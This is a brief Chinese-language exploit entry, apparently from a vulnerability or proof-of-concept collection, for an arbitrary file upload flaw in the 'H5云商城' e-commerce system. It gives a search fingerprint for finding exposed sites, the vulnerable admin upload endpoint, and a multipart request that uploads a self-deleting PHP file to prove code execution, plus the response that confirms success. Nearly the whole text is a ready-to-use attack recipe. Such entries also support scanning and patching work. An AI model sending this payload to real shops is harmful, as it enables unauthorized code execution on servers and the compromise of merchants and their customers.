# H5云商城-任意文件上传-file

H5云商城 ｜ 文件上传 ｜ —
- **指纹**：`body="/public/qbsp.php"`
- **请求**：`POST /admin/commodtiy/file.php?upload=1 HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryFQqYtrIWb8iBxUCx
Content-Disposition: form-data; name="file"; filename="dudesite.php"
Content-Type: application/octet-stream
<?php echo 111*111;unlink(__FILE__)?>
------WebKitFormBoundaryFQqYtrIWb8iBxUCx--
```
- **响应特征**：200 upload